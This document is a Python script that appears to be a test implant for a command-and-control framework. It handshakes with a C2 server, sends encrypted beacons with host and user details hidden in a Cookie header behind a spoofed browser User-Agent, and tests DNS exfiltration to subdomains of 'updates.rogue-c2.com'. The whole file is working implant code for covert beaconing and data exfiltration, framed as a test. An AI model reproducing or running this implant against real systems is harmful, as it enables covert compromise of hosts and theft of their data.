#!/usr/bin/env python3
"""
External implant for DNS tunneling test
"""

import os
import sys
import json
import base64
import time
import hashlib
import requests
from cryptography.fernet import Fernet

# Configuration
C2_URL = "http://127.0.0.1:4444"
IMPLANT_ID = "external_dns_test_001"
FINGERPRINT = hashlib.sha256(b"external_implant_fingerprint").hexdigest()

def handshake():
    """Perform handshake with C2."""
    print("[+] Performing handshake...")
    
    data = {
        "implant_id": IMPLANT_ID,
        "implant_id_hash": hashlib.md5(IMPLANT_ID.encode()).hexdigest()[:8],
        "fingerprint": FINGERPRINT
    }
    
    try:
        response = requests.post(
            f"{C2_URL}/handshake",
            json=data,
            timeout=10
        )
        
        if response.status_code == 200:
            result = response.json()
            print(f"[+] Handshake successful")
            print(f"[+] Session key: {result.get('key', 'NO KEY')[:20]}...")
            return result.get('key')
        else:
            print(f"[-] Handshake failed: {response.status_code}")
            print(f"[-] Response: {response.text}")
            return None
            
    except Exception as e:
        print(f"[-] Handshake error: {e}")
        return None

def beacon(session_key, use_dns=False):
    """Send beacon to C2."""
    print(f"[+] Sending beacon (DNS: {use_dns})...")
    
    # Create beacon data
    beacon_data = {
        "implant_id": IMPLANT_ID,
        "timestamp": time.time(),
        "system_info": {
            "hostname": "external-test-host",
            "platform": sys.platform,
            "python_version": sys.version,
            "user": os.environ.get('USER', 'unknown')
        },
        "use_dns": use_dns,
        "dns_capable": True,
        "location": "external_test"
    }
    
    # Encrypt with session key
    f = Fernet(session_key.encode())
    encrypted = f.encrypt(json.dumps(beacon_data).encode())
    
    # Send beacon
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Authorization': f'Bearer {IMPLANT_ID}',
        'Cookie': f'session={base64.b64encode(encrypted).decode()}'
    }
    
    try:
        response = requests.post(
            f"{C2_URL}/api/v1/telemetry",
            headers=headers,
            timeout=10
        )
        
        if response.status_code == 200:
            result = response.json()
            print(f"[+] Beacon successful")
            print(f"[+] Response: {result}")
            
            # Check for DNS tunnel status
            if use_dns and result.get('dns_tunnel'):
                print("[+] DNS tunnel enabled by C2!")
            elif use_dns:
                print("[-] DNS tunnel not enabled in response")
                
            return result
        else:
            print(f"[-] Beacon failed: {response.status_code}")
            print(f"[-] Response: {response.text}")
            return None
            
    except Exception as e:
        print(f"[-] Beacon error: {e}")
        return None

def test_dns_exfiltration():
    """Test DNS exfiltration directly."""
    print("[+] Testing DNS exfiltration...")
    
    try:
        sys.path.append('./payloads')
        from dnstunnel import DNSFragmenter
        
        fragmenter = DNSFragmenter("updates.rogue-c2.com")
        
        test_data = {
            "type": "dns_test",
            "implant_id": IMPLANT_ID,
            "timestamp": time.time(),
            "message": "Testing DNS exfiltration from external implant"
        }
        
        success = fragmenter.fragment_and_send(
            json.dumps(test_data).encode(),
            filename="dns_test.json",
            session_id=IMPLANT_ID
        )
        
        if success:
            print("[+] DNS exfiltration test successful")
            print("[+] Data sent via DNS queries to: *.updates.rogue-c2.com")
            return True
        else:
            print("[-] DNS exfiltration test failed")
            return False
            
    except Exception as e:
        print(f"[-] DNS exfiltration error: {e}")
        import traceback
        traceback.print_exc()
        return False

def main():
    """Main function."""
    print("=" * 60)
    print("External Implant - DNS Tunneling Test")
    print("=" * 60)
    
    # Step 1: Handshake
    session_key = handshake()
    if not session_key:
        print("[-] Cannot continue without session key")
        return
    
    # Step 2: Beacon with DNS request
    print("\n[1] Testing beacon with DNS request...")
    beacon_result = beacon(session_key, use_dns=True)
    
    if beacon_result:
        print("[+] HTTP beacon with DNS request successful")
    else:
        print("[-] HTTP beacon failed, trying without DNS...")
        beacon(session_key, use_dns=False)
    
    # Step 3: Test DNS exfiltration
    print("\n[2] Testing direct DNS exfiltration...")
    dns_success = test_dns_exfiltration()
    
    if dns_success:
        print("[+] DNS exfiltration working!")
    else:
        print("[-] DNS exfiltration test failed")
    
    print("\n" + "=" * 60)
    print("Test complete")
    print("=" * 60)

if __name__ == "__main__":
    main()
